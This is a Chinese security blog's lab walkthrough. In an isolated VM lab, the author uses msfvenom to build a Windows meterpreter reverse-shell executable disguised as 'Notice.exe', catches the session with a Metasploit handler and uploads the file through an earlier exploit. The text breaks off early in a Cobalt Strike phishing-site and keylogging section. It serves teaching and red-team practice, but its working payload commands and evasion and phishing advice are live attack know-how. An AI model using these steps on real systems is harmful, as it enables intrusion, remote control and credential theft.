<!doctype html><html lang=zh_CN dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="【2】制作WIndows恶意软件获取Shell"><meta name=keywords content="msfvenom,shell,Windowsl,CS"><title>【攻防实践】MSF恶意程序利用与CS钓鱼网站制作</title><link rel=canonical href=http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/><link rel=stylesheet href=/scss/style.min.85f75f3209ee69adac3c94c489274ecc9d07b319e20cd3c86717f7734ee67869.css><meta property='og:title' content="【攻防实践】MSF恶意程序利用与CS钓鱼网站制作"><meta property='og:description' content="【2】制作WIndows恶意软件获取Shell"><meta property='og:url' content='http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/'><meta property='og:site_name' content="Leuco's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='msfvenom'><meta property='article:tag' content='shell'><meta property='article:tag' content='Windowsl'><meta property='article:tag' content='CS'><meta property='article:published_time' content='2026-01-03T13:48:09+08:00'><meta property='article:modified_time' content='2026-01-03T13:48:09+08:00'><meta property='og:image' content='http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/CS.png'><meta name=twitter:title content="【攻防实践】MSF恶意程序利用与CS钓鱼网站制作"><meta name=twitter:description content="【2】制作WIndows恶意软件获取Shell"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/CS.png'></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_8cf2f27a1af30ef.png width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>Leuco's Blog</a></h1><h2 class=site-description></h2></div></header><ol class=menu-social><li><a href=https://github.com/leuco-yuu/ target=_blank title=GitHub rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a></li><li><a href='https://mail.google.com/mail/u/0/?tf=cm&amp;to=leucoyuu@gmail.com&amp;fs=1' target=_blank title=Gmail rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><polyline points="3,5 12,14 21,5"/></svg></a></li><li><a href='https://wpa.qq.com/msgrd?v=3&amp;uin=1286938728&amp;site=qq&amp;menu=yes/' target=_blank title=QQ rel=me><svg height="32" viewBox="0 0 32 32" width="32"><g fill="none" fill-rule="evenodd"><path d="m15.9998867.0-.3175962.00373031C8.84822.16478688 5.08430177 5.52571032 5.05900841 13.1032973L5.06 13.376l-.86256398 2.1053645c-.34339269.8459887-.59479858 1.4918602-.8236549 2.1249911-.16246446.4494579-.31092035.8862129-.4515632 1.3302912-1.41043336 4.4529342-1.46997142 7.7313526 1.14979123 8.0424546l.19586827.0182568c.69853306.0462522 1.18775172-.1357889 1.69345756-.5695745L6.008 26.385l.10703497.1859114.16295747.2641667L6.368 26.972l-.10203891.0725127c-1.18457469.8599516-1.78515849 2.0422997-.8749963 3.5478041.72014893 1.1919865 1.68579016 1.3851809 4.67654251 1.4059241h1.2781117l.7210113-.0101194c1.4578857-.0287327 2.9764342-.1065736 3.9343697-.2001215l.2555297.0243167c1.1291243.09698 2.8606159.1735357 4.3993902.1859242h1.2781118c2.9907546-.0207471 3.95642-.2139816 4.6768437-1.4064227l.0983227-.1723424c.764361-1.4241985.1648309-2.548721-.9747412-3.3755348L25.631 26.971l.0912293-.1362605.1629318-.2641511L25.992 26.385l.0466679.0427821c.5516504.4732059 1.0836451.6468525 1.8890001.5513616 2.6200145-.3116105 2.5604594-3.5895097 1.1502083-8.0424822-.136678-.4315245-.2810058-.8567817-.4385987-1.2939849l-.1781698-.4846461c-.0923296-.2464665-.1903348-.5013359-.2976536-.7744519l-.3954267-.9868956L26.939 13.376l9399e-7-.279262c-.038761-7.60576089-3.8169423-12.93053326-10.6187985-13.09291824zm1023e-7 2c6.339972 32813e-8 9.0947051 5.25726658 8.9334981 11.7557738l.8516442 2.0748544c.5606846 1.3708665.9939584 2.4718584 1.3860782 3.7098724 1.2134003 3.8314013.8203049 5.4169539.5209683 5.4525554-.6424867.0761796-2.5006035-2.8842697-2.5006035-2.8842697.0 1.7141775-.8994592 3.9510027-2.8457046 5.5664147l.3377045.1073023c1.0249215.341207 2.6653848 1.0302704 2.2154641 1.7750936-.4078113.675007-6.9962271.4309917-8.8982689.2207732l-.4753503.0452169c-2.33636.195172-8.04423656.3608021-8.42291849-.2659901-.50418989-.8339832 1.61195836-1.5976385 2.55205373-1.8820678-1.94652419-1.615412-2.84615056-3.852456-2.84615056-5.5667428l-.32111727.4924567c-.56063792.838483-1.70355568 2.4482423-2.17943051 2.391813-.29933663-.0355468-.69254342-1.6211541.52102408-5.4525554l.21887662-.6654718c.52220361-1.5311231 1.13363576-2.9515889 2.01884579-5.1193097C6.8963095 7.36281332 9.58861109 2.00032813 15.999989 2z" fill="currentColor" fill-rule="nonzero"/></g></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>主页</span></a></li><li><a href=/%E5%8D%9A%E4%B8%BB/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>博主</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>博文</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>搜索</span></a></li><li><a href=/%E9%93%BE%E6%8E%A5/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>链接</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ul><li><a href=#实践概览>实践概览</a></li><li><a href=#msfvenom>MSFVenom</a></li><li><a href=#cobalt-strike>Cobalt Strike</a></li><li><a href=#环境配置>环境配置</a></li><li><a href=#实践步骤>实践步骤</a><ul><li><a href=#mfs恶意程序利用>MFS恶意程序利用</a><ul><li><a href=#使用msfvenom制作恶意软件>使用msfvenom制作恶意软件</a></li><li><a href=#制作监听程序>制作监听程序</a></li><li><a href=#将恶意程序传输下载到靶机>将恶意程序传输下载到靶机</a></li><li><a href=#等待靶机执行恶意程序>等待靶机执行恶意程序</a></li></ul></li><li><a href=#cs钓鱼网站制作>CS钓鱼网站制作</a><ul><li><a href=#cobalt-strike安装>Cobalt Strike安装</a></li><li><a href=#更改cs读写权限>更改CS读写权限</a></li><li><a href=#生成cobalt-strike服务器组>生成Cobalt Strike服务器组</a></li><li><a href=#打开cobalt-strike客户端并连接服务器组>打开Cobalt Strike客户端并连接服务器组</a></li><li><a href=#创建监听器>创建监听器</a></li><li><a href=#网站克隆与web日志>网站克隆与Web日志</a></li><li><a href=#靶机访问钓鱼网站>靶机访问钓鱼网站</a></li><li><a href=#键盘记录>键盘记录</a></li></ul></li><li><a href=#cs菜单功能概览>CS菜单功能概览</a><ul><li><a href=#视图>视图</a></li><li><a href=#攻击>攻击</a></li></ul></li></ul></li></ul></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/><img src=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/CS_hu_4fa3b87d4ee2a5f9.png srcset="/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/CS_hu_4fa3b87d4ee2a5f9.png 800w, /p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/CS_hu_fbd24101d753a369.png 1600w" width=800 height=669 loading=lazy alt="Featured image of post 【攻防实践】MSF恶意程序利用与CS钓鱼网站制作"></a></div><div class=article-details><header class=article-category><a href=/categories/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/>网络空间安全
</a><a href=/categories/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5/>攻防实践</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/>【攻防实践】MSF恶意程序利用与CS钓鱼网站制作</a></h2><h3 class=article-subtitle>【2】制作WIndows恶意软件获取Shell</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2026-01-03T13:48:09+08:00>Jan 03, 2026</time></div></footer></div></header><section class=article-content><h1 id=msf恶意程序利用与cs钓鱼网站制作>MSF恶意程序利用与CS钓鱼网站制作</h1><div class=custom-toc><h3>目录</h3><nav id=TableOfContents><ul><li><a href=#实践概览>实践概览</a></li><li><a href=#msfvenom>MSFVenom</a></li><li><a href=#cobalt-strike>Cobalt Strike</a></li><li><a href=#环境配置>环境配置</a></li><li><a href=#实践步骤>实践步骤</a><ul><li><a href=#mfs恶意程序利用>MFS恶意程序利用</a><ul><li><a href=#使用msfvenom制作恶意软件>使用msfvenom制作恶意软件</a></li><li><a href=#制作监听程序>制作监听程序</a></li><li><a href=#将恶意程序传输下载到靶机>将恶意程序传输下载到靶机</a></li><li><a href=#等待靶机执行恶意程序>等待靶机执行恶意程序</a></li></ul></li><li><a href=#cs钓鱼网站制作>CS钓鱼网站制作</a><ul><li><a href=#cobalt-strike安装>Cobalt Strike安装</a></li><li><a href=#更改cs读写权限>更改CS读写权限</a></li><li><a href=#生成cobalt-strike服务器组>生成Cobalt Strike服务器组</a></li><li><a href=#打开cobalt-strike客户端并连接服务器组>打开Cobalt Strike客户端并连接服务器组</a></li><li><a href=#创建监听器>创建监听器</a></li><li><a href=#网站克隆与web日志>网站克隆与Web日志</a></li><li><a href=#靶机访问钓鱼网站>靶机访问钓鱼网站</a></li><li><a href=#键盘记录>键盘记录</a></li></ul></li><li><a href=#cs菜单功能概览>CS菜单功能概览</a><ul><li><a href=#视图>视图</a></li><li><a href=#攻击>攻击</a></li></ul></li></ul></li></ul></nav></div><h2 id=实践概览>实践概览</h2><ul><li><strong>名称</strong>：MSF恶意程序利用与CS上线</li><li><strong>目的</strong>：使用MSFVenom恶意软件获取shell；使用Cobalt Strike制作钓鱼网站并监听键盘</li><li><strong>时间</strong>：2026年1月3日</li><li><strong>风险说明</strong>：本实验在完全隔离的虚拟化实验室环境下进行，仅用于教育或授权测试</li></ul><h2 id=msfvenom>MSFVenom</h2><p><strong>定义：</strong> msfvenom 是 <strong>Metasploit Framework</strong> 的一部分，它是一个独立的 <strong>攻击载荷生成器</strong>。它取代了旧版的 <code>msfpayload</code> 和 <code>msfencode</code> 工具，用于创建和编码各种格式的 shellcode 或可执行文件。</p><p><strong>主要功能：</strong></p><ul><li><strong>生成载荷：</strong> 可以生成适用于几乎所有操作系统（Windows, Linux, macOS, Android等）和架构（x86, x64, ARM等）的攻击载荷。</li><li><strong>多种格式：</strong> 输出格式多样，如可执行文件（.exe, .elf）、动态链接库（.dll）、Web脚本（.php, .aspx）、Shell代码（C、Python、Ruby等格式的原始字节）等。</li><li><strong>编码与规避：</strong> 内置多种编码器（如 <code>x86/shikata_ga_nai</code>），可以对生成的载荷进行混淆，以绕过基础的静态杀毒软件（AV）检测。</li><li><strong>捆绑：</strong> 可以将攻击载荷与一个正常的合法程序（如计算器、PDF阅读器）捆绑在一起，诱骗目标运行。</li><li><strong>转换格式：</strong> 可以将载荷在不同格式之间转换。</li></ul><p><strong>典型工作流程：</strong></p><ol><li><p>红队人员决定攻击目标（例如：Windows 10 x64）。</p></li><li><p>使用 msfvenom 命令生成一个反向 TCP 连接的 Windows 后门：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msfvenom -p windows/x64/meterpreter/reverse_tcp <span class=nv>LHOST</span><span class=o>=</span>攻击机 <span class=nv>LPORT</span><span class=o>=</span><span class=m>4444</span> -f exe -o payload.exe
</span></span></code></pre></td></tr></table></div></div></li><li><p>通过社会工程学（如钓鱼邮件）将 <code>payload.exe</code> 投递到目标机器。</p></li><li><p>目标运行后，会在其机器上建立一个与攻击者 Metasploit 监听器（<code>multi/handler</code>）的连接。</p></li><li><p>攻击者获得一个 <strong>Meterpreter</strong> shell，可以进行基本的后期利用。</p></li></ol><p><strong>特点：</strong></p><ul><li><strong>免费且开源。</strong></li><li><strong>功能单一但强大</strong>，专注于载荷生成。</li><li>通常需要与 <strong>Metasploit Framework</strong> 的其他模块（如监听器、利用模块）配合使用。</li><li>在绕过现代EDR/AV方面能力有限，生成的载荷容易被高级安全软件检测。</li></ul><h2 id=cobalt-strike>Cobalt Strike</h2><p><strong>定义：</strong> Cobalt Strike 是一个 <strong>商业的、综合性的红队和对手模拟平台</strong>。它远不止一个载荷生成器，而是一个集成了 <strong>指挥与控制、钓鱼攻击、横向移动、权限提升、报告生成</strong> 等功能的完整作战系统。</p><p><strong>主要功能：</strong></p><ol><li><strong>高级攻击载荷：</strong><ul><li><strong>Beacon：</strong> Cobalt Strike 的核心载荷，是一个高度可定制的、隐蔽的“心跳”代理。支持多种通信协议（HTTP/HTTPS, DNS, SMB）和回调方式。</li><li>生成经过高度混淆、签名、或利用各种技术（如进程注入、模块反射式加载）的 Beacon 载荷，以绕过杀毒软件和终端检测与响应（EDR）。</li></ul></li><li><strong>图形化指挥与控制：</strong><ul><li>所有上线的被控主机（Beacon）都在一个直观的图形界面中显示，可以分组、打标签。</li><li>通过右键菜单或命令，轻松向任何 Beacon 发送指令（文件操作、截图、键盘记录、提权等）。</li></ul></li><li><strong>内网横向移动：</strong><ul><li><strong>端口扫描</strong>和<strong>服务发现</strong>。</li><li><strong>凭据转储</strong>（从内存中提取密码哈希和票据）。</li><li><strong>哈希传递</strong>、<strong>票据传递</strong> 攻击。</li><li><strong>SMB Beacon</strong> 用于穿透没有直接外网连接的内部网络节点。</li></ul></li><li><strong>鱼叉式网络钓鱼：</strong><ul><li>内置模板和服务器，可以方便地创建和管理钓鱼邮件活动，追踪点击和载荷执行情况。</li></ul></li><li><strong>Malleable C2 配置文件：</strong><ul><li>这是 Cobalt Strike 的灵魂功能。允许操作员 <strong>完全自定义 Beacon 的通信模式</strong>（如模拟成 Google、CloudFlare 等合法服务的流量），极大地增强了隐蔽性和对抗网络流量分析的能力。</li></ul></li><li><strong>团队协作：</strong> 支持多个操作员同时连接到一个团队服务器，协同工作。</li><li><strong>报告与日志：</strong> 自动记录所有操作，便于生成最终的攻击报告。</li></ol><p><strong>典型工作流程：</strong></p><ol><li>红队启动 <strong>Cobalt Strike 团队服务器</strong>。</li><li>操作员使用 <strong>Cobalt Strike 客户端</strong> 连接。</li><li>使用 <strong>“攻击”->“生成Payload”</strong> 创建一个高度定制的 Beacon（例如，使用 Malleable C2 配置文件模拟正常流量）。</li><li>通过 <strong>鱼叉式钓鱼</strong> 或利用其他漏洞投递 Beacon。</li><li>目标上线后，在可视化地图上看到新主机。</li><li>操作员通过 Beacon 进行信息收集，利用内置工具进行凭据转储，然后在内网横向移动，逐步控制更多关键资产。</li></ol><p><strong>特点：</strong></p><ul><li><strong>商业软件</strong>，价格昂贵，但功能极其强大。</li><li><strong>高度集成化和自动化</strong>，将红队行动的各个阶段无缝衔接。</li><li><strong>以隐匿和对抗现代安全防御为核心设计</strong>。</li><li>是 <strong>高级持续性威胁（APT）模拟</strong> 和 <strong>成熟红队</strong> 的首选工具。</li></ul><h2 id=环境配置>环境配置</h2><ul><li><strong>虚拟环境</strong>：VMware Workstation 17 Pro - 17.0.0 build-20800274</li><li><strong>靶机</strong>：<ul><li><strong>系统</strong>：Windows 7 Enterprise x64</li><li><strong>CPU</strong>：11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz (2.30 GHz)</li><li><strong>网络</strong>：LAN（IPv4:10.0.0.17/SubnetMask:255.255.255.0/Gateway:NULL/DNS:NULL）</li></ul></li><li><strong>攻击机</strong>：<ul><li><strong>系统</strong>：Linux kali 6.12.25-amd64</li><li><strong>CPU</strong>：11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz (2.30 GHz)</li><li><strong>网络</strong>：LAN（IPv4:10.0.0.223/SubnetMask:255.255.255.0/Gateway:NULL/DNS:NULL）</li></ul></li></ul><h2 id=实践步骤>实践步骤</h2><h3 id=mfs恶意程序利用>MFS恶意程序利用</h3><h4 id=使用msfvenom制作恶意软件>使用msfvenom制作恶意软件</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└─# msfvenom -p windows/meterpreter/reverse_tcp <span class=nv>LHOST</span><span class=o>=</span>10.0.0.223 <span class=nv>LPORT</span><span class=o>=</span><span class=m>4448</span> -f exe &gt; Notice.exe
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> No arch selected, selecting arch: x86 from the payload
</span></span><span class=line><span class=cl>No encoder specified, outputting raw payload
</span></span><span class=line><span class=cl>Payload size: <span class=m>354</span> bytes
</span></span><span class=line><span class=cl>Final size of exe file: <span class=m>73802</span> bytes
</span></span></code></pre></td></tr></table></div></div><p>文件存储于<code>/root/Notice.exe</code></p><h4 id=制作监听程序>制作监听程序</h4><p>监听程序的制作过程与<a class=link href=https://leuco-yuu.github.io/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#%E5%88%A9%E7%94%A8windows%E6%9C%8D%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81 target=_blank rel=noopener>Metasploit持久化后门攻击</a>相同：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 &gt; use exploit/multi/handler 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Using configured payload generic/shell_reverse_tcp
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; <span class=nb>set</span> payload windows/meterpreter/reverse_tcp
</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>=</span>&gt; windows/meterpreter/reverse_tcp
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; <span class=nb>set</span> LHOST 10.0.0.223
</span></span><span class=line><span class=cl><span class=nv>LHOST</span> <span class=o>=</span>&gt; 10.0.0.223
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; <span class=nb>set</span> LPORT <span class=m>4448</span>
</span></span><span class=line><span class=cl><span class=nv>LPORT</span> <span class=o>=</span>&gt; <span class=m>4448</span>
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; run
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Started reverse TCP handler on 10.0.0.223:4448 
</span></span></code></pre></td></tr></table></div></div><h4 id=将恶意程序传输下载到靶机>将恶意程序传输下载到靶机</h4><p>这里通过<a class=link href=https://leuco-yuu.github.io/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#metasploit%E6%89%AB%E6%8F%8F%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8 target=_blank rel=noopener>MS17-010漏洞与Metasploit</a>实现恶意程序的<a class=link href=https://leuco-yuu.github.io/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#3-%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E4%B8%8E%E4%B8%8A%E4%BC%A0 target=_blank rel=noopener>upload</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>meterpreter &gt; upload /root/Notice.exe &gt; C:<span class=se>\\</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Uploading  : /root/Notice.exe -&gt; C:<span class=se>\N</span>otice.exe
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Completed  : /root/Notice.exe -&gt; C:<span class=se>\N</span>otice.exe
</span></span></code></pre></td></tr></table></div></div><h4 id=等待靶机执行恶意程序>等待靶机执行恶意程序</h4><p>监听器获取到用户权限</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>177734</span> bytes<span class=o>)</span> to 10.0.0.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Meterpreter session <span class=m>1</span> opened <span class=o>(</span>10.0.0.223:4448 -&gt; 10.0.0.17:49864<span class=o>)</span> at 2026-01-03 08:00:49 +0000
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>meterpreter &gt; getuid
</span></span><span class=line><span class=cl>Server username: Ankh-PC<span class=se>\A</span>nkh
</span></span></code></pre></td></tr></table></div></div><h3 id=cs钓鱼网站制作>CS钓鱼网站制作</h3><p>为了克隆网站，虚拟机需要联网。这里设置靶机和Kali的网络连接模式为NAT模式，两者通过DHCP自动获取IP地址。此时Win7的IP地址为192.168.10.147/24；Kali的IP地址为192.168.10.135/24。两者之间与宿主机相互ping通并可以正常访问互联网</p><h4 id=cobalt-strike安装>Cobalt Strike安装</h4><p>将<a class=link href=cobalt_strike_4.5.zip>cobalt_strike_4.5.zip</a>下载至Kali并解压</p><h4 id=更改cs读写权限>更改CS读写权限</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
